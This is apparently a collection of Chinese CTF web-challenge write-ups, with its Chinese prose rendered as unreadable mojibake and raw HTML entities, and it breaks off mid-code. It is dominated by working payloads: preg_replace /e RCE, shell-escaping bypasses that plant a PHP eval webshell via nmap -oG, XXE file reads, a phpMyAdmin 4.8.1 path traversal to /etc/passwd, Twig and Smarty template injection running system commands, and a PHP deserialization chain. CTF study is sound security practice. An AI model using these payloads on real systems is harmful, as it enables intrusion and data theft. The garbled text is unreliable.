è¿™é‡Œå‘ç°preg_replaceç”¨äº†/eå‚æ•°ï¼Œæ˜¯å­˜åœ¨rceæ¼æ´çš„\nä½†æ˜¯è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å›ºå®šäº†ï¼Œæ¥ä¸‹æ¥å¼•ç”¨è¿™ç¯‡ï¼šæ–‡ç«  - æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº\n1 2 3 åå‘å¼•ç”¨ å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ \u0026#39;\\n\u0026#39; è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ æ‰€ä»¥è¿™é‡Œçš„ \\1 å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ï¼Œç„¶ååŸæ¥ç¬¬ä¸‰ä¸ªå‚æ•°è¾“å…¥å‘½ä»¤ï¼Œå°±ä¼šå˜æˆç¬¬äºŒä¸ªï¼ŒåŸæ¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å†™å…¥æ¨¡ç³ŠåŒ¹é….*å°±ä¼šåŒ¹é…ç°åœ¨çš„ç¬¬ä¸€ä¸ªå‚æ•°\\1ï¼Œç„¶åå°±ä¼šè§¦å‘/eå‚æ•°æ¼æ´\nä½†æ˜¯.*åœ¨phpé‡Œé¢ï¼Œå¯¹äºä¼ å…¥çš„éæ³•çš„ $_GET æ•°ç»„å‚æ•°åï¼Œä¼šå°†å…¶è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œæˆ‘ä»¬æ”¹ä¸ºS*\næœ€ç»ˆpayload\n1 2 \\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;ls /\u0026#39;) \\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;cat /flag\u0026#39;) è¿™é‡Œç”¨${}åŒ…è£¹å‡½æ•°ï¼Œæ˜¯phpå¯å˜å˜é‡çš„åŸå› ï¼šPHP: å¯å˜å˜é‡ - Manual\nåœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œã€‚ ${phpinfo()} ä¸­çš„ phpinfo() ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ ${1} (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true)\n[BUUCTF 2018]Online Tool 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if(!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\u0026#34;glzjin\u0026#34;. $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); } è¿™é‡Œescapeshellargå’Œescapeshellcmdå‡½æ•°æŒ‰è¿™æ ·é¡ºåºè°ƒç”¨æœ‰ä¸ªæ¼æ´\nå‚è€ƒï¼šPHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡\n1 2 3 4 ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2\u0026#39; -v -d a=1 ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†\u0026#39;172.17.0.2\u0026#39;\\\u0026#39;\u0026#39; -v -d a=1\u0026#39;ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚ ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ\u0026#39;172.17.0.2\u0026#39;\\\\\u0026#39;\u0026#39; -v -d a=1\\\u0026#39;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl \u0026#39;172.17.0.2\u0026#39;\\\\\u0026#39;\u0026#39; -v -d a=1\\\u0026#39;ï¼Œç”±äºä¸­é—´çš„\\\\è¢«è§£é‡Šä¸º\\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„\u0026#39;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„\u0026#39;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\\ -v -d a=1\u0026#39;ï¼Œå³å‘172.17.0.2\\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1\u0026#39;ã€‚ ç„¶åæˆ‘ä»¬åªè¦æŠŠæƒ³è¦æ‰§è¡Œçš„è¯­å¥ç”¨å•å¼•å·æ‹¬èµ·æ¥åŠ ç©ºæ ¼å°±èƒ½ç»•è¿‡\nè¿™é‡Œæœ€åç”¨nmapå‘½ä»¤ï¼Œnmapæœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶\n1 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.php \u0026#39; ç„¶åèšå‰‘è¿æ¥\nè¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆåŠ å¼•å·å’Œç©ºæ ¼\nå¦‚æœåé¢æ²¡æœ‰åŠ å¼•å·ï¼Œåœ¨ä¼ æ–‡ä»¶ä¹‹åï¼Œæ–‡ä»¶ååä¼šå¤šä¸€ä¸ªå¼•å·\n1 2 3 4 5 6 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php å› ä¸ºå…ˆç»è¿‡escapeshellarg()è¿™ä¸ªå‡½æ•°å¤„ç†ï¼Œå…ˆä¼šå¯¹å‰é¢çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åå†æŠŠå‰é¢å’Œåé¢çš„å†…å®¹ç”¨å•å¼•å·æ‹¬èµ·æ¥è¿æ¥ï¼Œå› ä¸ºåŸæœ¬è¿™ä¸ªå•å¼•å·å‰é¢æ²¡æœ‰å†…å®¹ï¼Œæ‰€ä»¥å‰é¢åªä¼šå¤šä¸€å¯¹å•å¼•å· ?host=\u0026#39;\u0026#39;\\\u0026#39;\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php\u0026#39; ç„¶åå†ç»escapeshellcmd()å‡½æ•°å¤„ç†,escapeshellcmdå¯¹\\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰,è¿˜ä¼šå¯¹è¿™äº›å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼š ?host=\u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?php @eval\\($_POST\\[\u0026#34;cmd\u0026#34;\\]\\)\\;\\?\\\u0026gt; -oG test.php\\\u0026#39; æ‰€ä»¥æœ€åä¼šå¤šä¸€ä¸ªå•å¼•å· ä½†å¦‚æœåŠ äº†å¼•å·ï¼Œä½†æ˜¯æœ€åä¸€ä¸ªå¼•å·å‰é¢æ²¡æœ‰åŠ ç©ºæ ¼ï¼Œé‚£æ ·æ–‡ä»¶ååé¢ä¼šå¤šåŒæ–œæ \n1 2 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php\u0026#39; \u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?\\php @eval\\($_POST\\[\u0026#34;cmd\u0026#34;\\]\\)\\;\\?\\\u0026gt; -oG test.php\u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; ç©ºæ ¼ä½œç”¨å°±æ˜¯æŠŠæ–‡ä»¶ååé¢çš„åŒæ–œæ éš”å¼€\n[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ ç›®å½•æ‰«æå‘ç°.gitåé¢ç›®å½•æœ‰ä¸œè¥¿ï¼Œæ€€ç–‘gitæºç æ³„éœ²\ngithackä¸‹è½½æºç \nä¸‹è½½äº†index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php include \u0026#34;flag.php\u0026#34;; echo \u0026#34;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ\u0026lt;br\u0026gt;\u0026#34;; if(isset($_GET[\u0026#39;exp\u0026#39;])){ if (!preg_match(\u0026#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/et|na|info|dec|bin|hex|oct|pi|log/i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { // echo $_GET[\u0026#39;exp\u0026#39;]; @eval($_GET[\u0026#39;exp\u0026#39;]); } else{ die(\u0026#34;è¿˜å·®ä¸€ç‚¹å“¦ï¼\u0026#34;); } } else{ die(\u0026#34;å†å¥½å¥½æƒ³æƒ³ï¼\u0026#34;); } } else{ die(\u0026#34;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\u0026#34;); } } // highlight_file(__FILE__); ?\u0026gt; (?R)? : (?R)ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª(/[a-z,_]+((?R)?)/)ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…a(b(c()d()))ï¼‰\nåªèƒ½æ— å‚rceäº†\næ„é€ payload\n1 2 3 4 5 6 7 exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); highlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºï¼Œæœ¬å‡½æ•°æ˜¯show_source() çš„åˆ«å next() è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ å’Œä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚ array_reverse() å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚(ä¸»è¦æ˜¯èƒ½è¿”å›å€¼) scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚ pos() è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚ localeconv() å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯\u0026#34;.\u0026#34;ã€‚ loacleconv å‡½æ•°ä¼šå›ºå®šè¿”å›ä¸€ä¸ª . ç„¶åposå°†æˆ‘ä»¬è·å¾—çš„ .è¿”å›åˆ°æˆ‘ä»¬æ„é€ çš„ payload ä½¿å¾— scandirèƒ½å¤Ÿè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ•°ç»„ï¼ˆæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯»å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰array_reverse()ä»¥ç›¸åçš„é¡ºåºè¾“å‡ºï¼ˆç›®çš„æ˜¯ä»¥æ­£åºè¾“å‡ºæŸ¥è¯¢å‡ºæ¥çš„å†…å®¹ï¼‰ç„¶å next æå–ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå°†.è¿‡æ»¤å‡ºå»ï¼‰ï¼Œæœ€åç”¨highlight_file()ç»™æ˜¾ç¤ºå‡ºæ¥ã€‚\næˆ–è€…ç”¨session_idæ¥è·å¾—flag\n1 ?exp=highlight_file(session_id(session_start())); æ·»åŠ cookieçš„phpsessidå€¼\n[NCTF2019]Fake XML cookbook xxeæ¼æ´\nç›´æ¥ç§’äº†\n1 2 3 4 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE ANY[ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; ]\u0026gt; ä¸‹é¢usernameå¡«\u0026amp;xxe;\n[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“ æˆ‘ç›®å½•æ‰«ææ‰«ä¸å‡ºæ¥åªèƒ½çœ‹åˆ«äººçš„äº†\næœ‰ä¸ªrobots.txt\næ²¡ä»€ä¹ˆç”¨\nä½†æ˜¯ä¹Ÿæ‰«åˆ°phpmyadmin\n1 /phpmyadmin/index.php ç‰ˆæœ¬ä¸º4.8.1ï¼Œæœ‰æœ‰ä¸ªcveæ¼æ´\næ¼æ´å¤ç°ï¼šphpMyAdmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« CVE-2018-12613 æ¼æ´å¤ç°_phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´(cve-2018-12613) phpmyadm-CSDNåšå®¢\nç›´æ¥æŠ„payload\n1 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd æœ‰å›æ˜¾\nç›´æ¥è¯»flag\n1 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag [BJDCTF2020]Mark loves cat bydæ‰«ä¸å‡ºæ¥æ²¡è®¾timeout,å¯ä»¥æŠŠçº¿ç¨‹è°ƒä½ï¼Œä½†æ˜¯å¤ªæ…¢äº†ï¼Œ-tè°ƒçº¿ç¨‹\n1 python dirsearch.py -e * -u http://ebc4f861-217c-4e5b-8de7-510518bd30be.node5.buuoj.cn:81/ -t 1 --timeout=2 -x 429 å­˜åœ¨gitæ³„éœ²ï¼Œgithackä¸‹è½½æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; ä¸»è¦åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œ\n1 2 3 4 5 6 7 foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } æˆ‘ä»¬è¦æ±‚æœ€åè¾“å‡ºflagï¼Œè¦ç»•è¿‡ä¸‰ä¸ªifå¾ˆå›°éš¾ï¼Œä½†æ˜¯å¦‚æœæŠŠexité‡Œé¢çš„å˜é‡è¦†ç›–ä¹Ÿèƒ½è¾“å‡ºflag\n1 2 3 4 5 6 ?yds=flag è¿™é‡Œgetä¼ å‚ $x=yds;$y=flag $$x=$yds;$$y=$flag æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶ è¿™æ ·exitå°±ä¼šè¿”å›$flagçš„å€¼ 1 2 ?is=flag\u0026amp;flag=flag æ»¡è¶³ç¬¬ä¸‰ä¸ªæ¡ä»¶ 1 2 3 ?handsome=flag\u0026amp;flag=x\u0026amp;x=flag è¿™é‡Œå› ä¸ºgetä¼ å‚ï¼Œ$x=$flag,flag=x,æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ æˆ–è€…ç›´æ¥?handsome=flag\u0026amp;flag=handsome [WUSTCTF2020]æœ´å®æ— å è¿™é‡Œintvalé‡Œé¢çš„æ•°è¦å°äº2020ä½†æ˜¯+1ä¹‹åè¦å¤§äº2021\nç”¨åˆ°ç§‘å­¦è®¡æ•°æ³•ï¼Œåˆšå¼€å§‹2e5ä¼šè¢«è§£ææˆ2ï¼Œä½†æ˜¯åŠ ä¸€ä¹‹åä¼šè¢«è§£æä¸º20001ï¼Œç¬¦åˆæ¡ä»¶\n1 2 3 if (isset($_GET[\u0026#39;md5\u0026#39;])){ $md5=$_GET[\u0026#39;md5\u0026#39;]; if ($md5==md5($md5)) è¦æ±‚è·ŸåŸå­—ç¬¦ä¸²ç›¸åŒçš„MD5\nåªæœ‰0e215962017\n[BJDCTF2020]Cookie is so stable cookieæœ‰é—®é¢˜ï¼Œç»“åˆè¿™ä¸ªæ¯”èµ›ä¹‹å‰çš„é¢˜ç›®æ€€ç–‘ssti\n1 {{7*\u0026#39;7\u0026#39;}}å›æ˜¾49è¯´æ˜æ˜¯twigæ¨¡æ¿æ³¨å…¥ ç›´æ¥ä¸Špayload\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} [CISCN2019 åä¸œå—èµ›åŒº]Web11 smartyæ³¨å…¥\nç›´æ¥xffå¤´ä¸Š{system(\u0026lsquo;cat /flag\u0026rsquo;)}\n[MRCTF2020]Ezpop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } å…ˆæ‰¾å…¥å£__constructï¼Œå‘ç°__get()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå‡½æ•°å¯ä»¥è§¦å‘__invokeæ–¹æ³•ï¼Œæ‰€ä»¥è®©p=new Modifier(),è¿™é‡Œä¼šè°ƒç”¨appendæ¥è¯»å–varçš„å€¼ï¼Œæˆ‘ä»¬varè®¾ç½®ä¸ºä¼ªåè®®è¯»flag,è¿˜å‰©ä¸¤ä¸ªæ–¹æ³•æ²¡è¢«è§¦å‘\n__tostringå¯ä»¥ç”±showä¸‹é¢çš„__wakeup()é‡Œé¢çš„æ­£åˆ™åŒ¹é…ä¼šæŠŠsourceå˜å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥è®©source=new Show(),è§¦å‘ä¹‹åä¼šè¿”å›str-\u0026gt;source,è¿™é‡Œå¦‚æœå°†strä¼ ç»™__get(),ç”±äºä¼šè¾“å‡ºä¸å­˜åœ¨çš„å˜é‡sourceæˆåŠŸè§¦å‘\næ‰€ä»¥å®Œæ•´çš„popé“¾\n1 new showè§¦å‘__construct,ç„¶åsource=new showè§¦å‘__tostring,str=new testè§¦å‘__get,p=new Modifier()è§¦å‘__invoke,æœ€åè°ƒç”¨appendè¾“å‡ºflag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php class Modifier { protected $var=\u0026#39;php://filter/read=convert.base64-encode/resource=flag.php\u0026#39;; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } $a= new Modifier(); $b= new Show(); $c= new Test(); $b-\u0026gt;source=new Show(); $b-\u0026gt;source-\u0026gt;str=$c; $c-\u0026gt;p=$a; echo urlencode(serialize($b)); [å®‰æ´µæ¯ 2019]easy_web å›¾ç‰‡urlçœ‹èµ·æ¥æ˜¯base64\nè§£ç çœ‹çœ‹\nä¸¤æ¬¡base64åŠ ä¸€ä¸ªhexè½¬ascii\næ„é€ index.phpè¯»å–\n1 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;]))); $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file); if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixiï½ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo(\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } ?\u0026gt; è¿™é‡Œè¦md5å¼ºæ¯”è¾ƒç»•è¿‡åªèƒ½æ‰¾payloadäº†\n1 2 3 4 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 æˆ–è€… a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 [MRCTF2020]PYWebsite [å®‰æ´µæ¯ 2019]easy_serialize_php æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php $function = @$_GET[\u0026#39;f\u0026#39;]; function filter($img){ $filter_arr = array(\u0026#39;php\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;php5\u0026#39;,\u0026#39;php4\u0026#39;,\u0026#39;fl1g\u0026#39;); $filter = \u0026#39;/\u0026#39;.implode(\u0026#39;|\u0026#39;,$filter_arr).\u0026#39;/i\u0026#39;; return preg_replace($filter,\u0026#39;\u0026#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\u0026#34;user\u0026#34;] = \u0026#39;guest\u0026#39;; $_SESSION[\u0026#39;function\u0026#39;] = $function; extract($_POST); if(!$function){ echo \u0026#39;\u0026lt;a 